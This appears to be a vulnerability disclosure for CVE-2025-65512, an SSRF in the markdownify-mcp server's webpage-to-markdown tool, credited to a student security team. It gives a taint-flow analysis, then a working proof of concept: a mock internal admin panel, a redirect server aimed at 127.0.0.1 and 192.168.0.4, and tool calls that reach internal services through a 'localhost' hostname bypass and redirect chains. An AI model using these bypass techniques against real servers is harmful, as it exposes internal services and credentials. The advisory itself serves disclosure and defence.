# CVE-2025-65512

## Summary

A Server-Side Request Forgery (SSRF) vulnerability was discovered in the webpage-to-markdown conversion feature of the markdownify-mcp server. 

This vulnerability allows an attacker to bypass private IP restrictions through hostname-based bypass and HTTP redirect chains, enabling access to internal network services. 

The impact includes potential exposure of sensitive internal administrative endpoints and credentials.

---

## Details

### Vulnerability Overview

The markdownify-mcp server provides functionality to convert web pages to markdown format by fetching user-supplied URLs. It performs an HTTP request from the server to the provided URL and converts the response (HTML) to markdown format.

The issue arises because the feature performs these HTTP requests without properly validating the user-supplied URL. In particular, two critical flaws exist:

1. The `is_ip_private()` function only validates IP address strings but does not resolve hostnames to their actual IP addresses
2. The `fetch()` function automatically follows HTTP redirects without re-validating the redirected destination URLs

This allows attackers to access internal services through hostname bypass (e.g., using "localhost" instead of "127.0.0.1") or by chaining HTTP redirections from public or localhost URLs to any internal addresses (127.0.0.1, 192.168.x.x, 10.x.x.x, 172.16-31.x.x).

### Root Cause

The `fetch()` function is called without proper URL validation or hostname resolution, and redirects are automatically followed without re-validation, which enables attackers to access internal services on the private network.

### Taint Flow

- **Taint 01: Request Handler**

`src/server.ts` Lines 41-42

```tsx
const { name, arguments: args } = request.params;
const validatedArgs = RequestPayloadSchema.parse(args);

```

- **Taint 02: Insufficient Validation**

`src/server.ts` Lines 55-62

```tsx
const parsedUrl = new URL(validatedArgs.url);

if (!["http:", "https:"].includes(parsedUrl.protocol)) {
  throw new Error("Only http: and https: schemes are allowed.");
}

if (is_ip_private(parsedUrl.hostname)) {
  throw new Error(`Fetching ${validatedArgs.url} is potentially dangerous, aborting.`);
}

```

The validation only checks the hostname string without DNS resolution:

- `is_ip_private("127.0.0.1")` → returns `true` (blocked)
- `is_ip_private("localhost")` → returns `false` (bypassed!)
- **Taint 03: Unsafe Fetch**

`src/Markdownify.ts` Lines 66-68

```tsx
if (url) {
  const response = await fetch(url);
}

```

---

## PoC

### PoC Description

This vulnerability was verified in a local development environment. The markdownify-mcp server was running at the default configuration, and multiple attack methods were successfully demonstrated. Upon a successful attack, the server returned the entire link structure of the internal admin panel, including sensitive administrative URLs such as `/api/users`, `/api/secrets`, and `/api/database`.

### Internal Admin Server (Mock)

```python
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def admin():
    return render_template_string("""
    <html>
    <h1>Internal Admin Panel</h1>
    <ul>
        <li><a href="/api/users">User Management</a></li>
        <li><a href="/api/secrets">API Keys</a></li>
        <li><a href="/api/database">Database Config</a></li>
        <li><a href="/api/logs">System Logs</a></li>
    </ul>
    """)

@app.route('/api/users')
def users():
    return render_template_string("""
    <html>
    <h1>Users</h1>
    <ul>
        <li><a href="/api/users/admin">admin (root)</a></li>
        <li><a href="/api/users/operator">operator</a></li>
    </ul>
    <a href="/">Back</a>
    """)

@app.route('/api/secrets')
def secrets():
    return render_template_string("""
    <html>
    <h1>Secrets</h1>
    <ul>
        <li><a href="/api/secrets/db_key">DB Key: sk-1234567890abcdef</a></li>
        <li><a href="/api/secrets/aws_key">AWS Key: AKIAIOSFODNN7EXAMPLE</a></li>
    </ul>
    <a href="/">Back</a>
    """)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

```

### Redirect Server

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def redirect_to_localhost():
    return redirect('<http://127.0.0.1:8080/api/users>', code=302)

@app.route('/redirect-internal')
def redirect_to_internal_network():
    # Can also redirect to internal network addresses
    return redirect('<http://192.168.0.4:8080/api/secrets>', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9309)

```

### Attack Examples

(An error in the picture is a "Window OS" configuration problem. Markdown files are generated normally)

**Method 1: Hostname Bypass**

```bash
markdownify:webpage-to-markdown url="<http://localhost:8080/>"

```

<img src="https://github.com/P0LESTAR/MCP-Server-Vuln-Analysis/img/image.png" alt="img">

**Method 2: Redirect Chain (localhost)**

```bash
markdownify:webpage-to-markdown url="<http://localhost:9309/redirect>"

```

<img src="https://github.com/P0LESTAR/MCP-Server-Vuln-Analysis/img/image2.png" alt="img">

**Method 3: Redirect to Internal Network**

```bash
markdownify:webpage-to-markdown url="<http://localhost:9309/redirect-internal>"
# Redirects to 192.168.0.4:8080 (internal network address)

```

<img src="https://github.com/P0LESTAR/MCP-Server-Vuln-Analysis/img/image3.png" alt="img">


**Blocked (for comparison):**

```bash
markdownify:webpage-to-markdown url="<http://127.0.0.1:8080/>"
# Error: Fetching <http://127.0.0.1:8080/> is potentially dangerous, aborting.

markdownify:webpage-to-markdown url="<http://192.168.0.4:8080/>"
# Error: Fetching <http://192.168.0.4:8080/> is potentially dangerous, aborting.

```

---

## Impact

This is a Server-Side Request Forgery (SSRF) vulnerability.

**Who is impacted?**

Any user running the markdownify-mcp server that processes external URLs, particularly in environments with internal services or cloud deployments.

**Risk:**

Attackers can leverage the markdownify-mcp server to:

- Access internal services via hostname bypass or redirect chains
- Bypass firewall rules and access restrictions
- Enumerate internal administrative interfaces
- Extract sensitive data from internal APIs and admin panels

**Severity Assessment:**

| Environment | Severity |
| --- | --- |
| General deployment | HIGH |
| Cloud environment | CRITICAL |

This vulnerability significantly increases the risk of internal service enumeration and potential lateral movement in an enterprise environment.

---

**reported by:** Team off-course (K-Shield.Jr 15th )